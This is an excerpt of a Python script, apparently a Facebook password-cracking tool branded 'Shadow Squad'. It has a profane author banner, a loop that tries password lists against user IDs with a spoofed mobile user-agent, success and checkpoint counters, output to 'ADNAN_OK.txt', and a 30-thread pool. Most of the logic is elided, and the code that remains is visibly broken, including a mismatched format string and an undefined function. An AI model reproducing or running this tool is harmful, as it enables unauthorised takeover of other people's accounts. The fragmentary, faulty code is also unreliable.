#!/usr/bin/python3
#FUCKED BY ADNAN ISLAM - SHADOW SQUAD
...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36;]"}
...
logo=""" ___________ ADNAN ISLAM ____________
____________________________________________
github   : SHADOW.SQUAD.BROTHEr
Facebook : MD SAGIR SHIKDER
YouTube  : NAIGA RE MAMA
Whatsapp : AGE USE KORTAM ARKI
-----------------------------------------------------
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    nt('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mADNAN_OK.txt' % (H, P, str(len(ok))))
...
def Kashif():
    ...
    print(' [2] exit ')
    print('')
    _ADNAN___ = input(' [?] Choose option : ')
    if _ADNAN___ in ('1', '01'):
        __xxx__().ADNANx(id)
    if _ADNAN___ in ('E', 'ee'):
        pass
...
class __xx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r \033[1;92m[ADNAN] {loop}/{len(self.id)} OK={len(ok)}-CP={len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                header = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 11; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36",
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with ADNANssb(max_workers=30) as ssbworld:
